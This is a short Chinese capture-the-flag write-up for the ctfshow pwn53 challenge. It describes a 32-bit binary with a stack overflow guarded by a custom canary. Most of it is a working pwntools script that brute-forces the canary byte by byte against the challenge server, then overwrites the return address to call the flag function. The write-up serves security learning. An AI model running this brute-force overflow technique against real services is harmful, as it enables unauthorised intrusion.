## ctfshow pwn53

![image-20241118193359939](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241118193359939.png)

这里没有开启栈保护

这个是一个32位的的程序放到ida pro中发现了一个常见的格式

![image-20241118202038577](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241118202038577.png)

![image-20241118202023686](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241118202023686.png)

发现这里发现栈溢出但是由于他会检测s1中的文字因此我们的刚开始溢出不可以加到r这个位置并且所以我们的要先爆破他的canary中的值

exp：
```python
from pwn import *


context.log_level="critical"
canary = b''
for i in range(4):
    for c in range(255):
        io = remote("pwn.challenge.ctf.show", 28151)
        # io = process("/home/fofa/pwn")
        io.sendlineafter('>','-1')
        payload = b'a'*0x20+canary+p8(c)
        io.sendafter("$ ",payload)
        ans = io.recv()
        print(ans)
        if b'Canary Value Incorrect!' not in ans:
            canary +=p8(c)
            break
        else:
            print("ting____")
        io.close()
print(canary)

io = remote("pwn.challenge.ctf.show", 28151)
elf = ELF("/home/fofa/pwn")
flag = elf.sym['flag']
payload = b'a' * 0x20 + canary + p32(0)*4+p32(flag)
io.sendlineafter('>','-1')#这里主要是进行对上一个相应的关闭
io.sendafter('$ ',payload)


io.interactive()
```

可以得到flag

